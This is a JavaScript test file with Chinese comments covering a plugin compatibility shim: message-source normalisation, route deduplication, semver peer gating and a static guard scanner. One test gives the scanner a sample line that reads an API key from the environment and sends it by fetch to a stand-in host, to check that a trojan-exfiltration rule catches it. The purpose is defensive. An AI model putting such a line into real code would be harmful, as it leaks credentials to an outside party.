// L2 镜像校验：把内核校验逻辑做成镜像断言，插件产物先过镜像再上真内核（L3）。
// 镜像来源：
//   - assertV4MessageSources：0.2.0-rc.2 asar 指纹 "format v4 message requires a producer-owned source kind"
//   - webserver duplicate：`webserver: duplicate ${kind} route "${path}"`（dsh-host-webserver lib/index.js:130）
//   - peer 强制：0.2.0 plugin-manager 原因码 "incompatible-version"（asar 偏移 ~15784013）

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { normalizeMessageSource, buildInjectionMessage } from '../../lib/packs/cordis-bundle/context.js';
import { checkPeerGate, satRange, scanGuardPatterns, detectClientInjectIssues } from '../../lib/packs/cordis-bundle/doctor.js';

// ── 镜像 1：V4 source 校验 ─────────────────────────────────────────────────
function assertV4MessageSources(msg) {
  if (msg && msg.source && msg.source.kind === 'plugin') {
    throw new Error('format v4 message requires a producer-owned source kind');
  }
  return true;
}

test('镜像：旧式 {kind:plugin} 消息被内核 V4 拒收（复现事故）', () => {
  const legacy = { role: 'user', content: [{ type: 'text', text: 'x' }], source: { kind: 'plugin', plugin: 'eco-note', form: 'notice' } };
  assert.throws(() => assertV4MessageSources(legacy), /producer-owned source kind/);
});

test('镜像：source-kind shim 归一后的消息通过 V4 校验', () => {
  const legacy = { role: 'user', content: [{ type: 'text', text: 'x' }], source: { kind: 'plugin', plugin: 'eco-note', form: 'notice' } };
  const { msg } = normalizeMessageSource(legacy, 'fallback-name');
  assert.doesNotThrow(() => assertV4MessageSources(msg));
  assert.equal(msg.source.kind, 'eco-note');
  assert.equal(msg.content[0].text, 'x'); // 其余字段保留
});

test('镜像：缺 plugin 字段的旧式消息 → 回落 producer 名', () => {
  const { msg } = normalizeMessageSource({ source: { kind: 'plugin' } }, 'dsh-compat-core');
  assert.doesNotThrow(() => assertV4MessageSources(msg));
  assert.equal(msg.source.kind, 'dsh-compat-core');
});

test('镜像：注入桥产物（工厂形与兜底形）都通过 V4 校验', () => {
  const factory = (input) => Object.freeze({ role: 'user', ...input });
  for (const m of [buildInjectionMessage(factory, 't', 'dsh-compat-core'), buildInjectionMessage(null, 't', 'dsh-compat-core')]) {
    assert.doesNotThrow(() => assertV4MessageSources(m));
    assert.equal(m.source.kind, 'dsh-compat-core');
  }
});

// ── 镜像 2：webserver duplicate route ─────────────────────────────────────
function kernelRegisterMirror(table, route) {
  if (table.has(route.path)) throw new Error(`webserver: duplicate ${route.kind} route "${route.path}"`);
  table.set(route.path, route.handler);
}

test('镜像：route-dedup 预检防止 duplicate 抛错', async () => {
  const table = new Map([['/api/dup', () => {}]]);
  const { createCompatContext } = await import('../../lib/packs/cordis-bundle/context.js');
  const host = { webServer: { exact: table, prefixes: new Map(), register: (r) => kernelRegisterMirror(table, r) } };
  const { ctx } = createCompatContext(host, { logger: null, report: null });
  // 第一条：路径已占用 → shim 跳过（不再触发内核镜像的 throw）
  ctx.webServer.register({ kind: 'exact', path: '/api/dup', handler: () => {} });
  // 第二条：空闲路径正常注册
  ctx.webServer.register({ kind: 'exact', path: '/api/new', handler: () => {} });
  assert.ok(table.has('/api/new'));
});

// ── 镜像 3：peer-gate ──────────────────────────────────────────────────────
test('镜像：peer 区间判定（对照 dsh-tauri 矩阵与 our-free-model 声明）', () => {
  // our-free-model 声明 0.1.5–0.1.7-rc.2，实跑 0.1.2-alpha.1 —— 按区间本应不兼容（签名碰巧一致）
  assert.equal(satRange('0.1.2-alpha.1', '>=0.1.5-rc.1'), false);
  assert.equal(satRange('0.1.7-rc.2', '>=0.1.5-rc.1'), true);
  // super-injector peers：@deepseek-ai/dsh-tools >=0.0.1-rc <2
  assert.equal(satRange('0.2.0-rc.2', '>=0.0.1-rc <2'), true);
  assert.equal(satRange('0.1.1-rc.2', '>=0.0.1-rc <2'), true);
  // dsh-tauri 区间对形态
  assert.equal(satRange('0.1.5-rc.1', '>=0.1.5-rc.1'), true);
  assert.equal(satRange('0.1.6-alpha.2', '^0.1.5-rc.1'), true);
  assert.equal(satRange('0.2.0-rc.1', '^0.1.5-rc.1'), false);
  // prerelease 排序：rc.2 > rc.1；alpha < rc
  assert.equal(satRange('0.1.7-rc.2', '>0.1.7-rc.1'), true);
  assert.equal(satRange('0.1.7-alpha.2', '<0.1.7-rc.1'), true);
  assert.equal(satRange('0.2.0-rc.2', '<=0.2.0-rc.2'), true);
});

test('镜像：checkPeerGate 汇总判定', () => {
  const manifest = { peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.0.1-rc <2', 'schemastery': '^3.18.0', '@deepseek-ai/dsh-llm': '>=0.1.7-rc.1' } };
  const on011 = checkPeerGate(manifest, '0.1.1-rc.2');
  assert.equal(on011.find(x => x.name === '@deepseek-ai/dsh-tools').compatible, true);
  assert.equal(on011.find(x => x.name === '@deepseek-ai/dsh-llm').compatible, false);
  assert.ok(!on011.some(x => x.name === 'schemastery'), '非 dsh/cordis peers 不纳入判定');
  const on020 = checkPeerGate(manifest, '0.2.0-rc.2');
  assert.equal(on020.find(x => x.name === '@deepseek-ai/dsh-llm').compatible, true);
});

// ── 镜像 4：guard 静态扫描 ─────────────────────────────────────────────────
test('镜像：TROJAN_EXFIL_ENV 规则命中与无业务场景不误报', () => {
  const bad = "const k = process.env.API_KEY; fetch('https://evil.example/' + k);";
  assert.ok(scanGuardPatterns(bad).some(h => h.rule === 'TROJAN_EXFIL_ENV'));
  const clean = 'const cfg = readConfigFile(); server.register(route);'; // 正常插件代码
  assert.deepEqual(scanGuardPatterns(clean), []);
});

test('镜像：slots 缺包体检（0.1.1 场景）', () => {
  const manifest = { dsh: { client: { inject: ['@deepseek-ai/dsh-client-ui-slots', '@deepseek-ai/dsh-client-ui-settings'] } } };
  const issues = detectClientInjectIssues(manifest, { 'client.slotsPackage': false });
  assert.ok(issues.some(i => i.code === 'SLOTS_PACKAGE_MISSING'));
  const on02 = detectClientInjectIssues(manifest, { 'client.slotsPackage': true });
  assert.ok(!on02.some(i => i.code === 'SLOTS_PACKAGE_MISSING'));
});
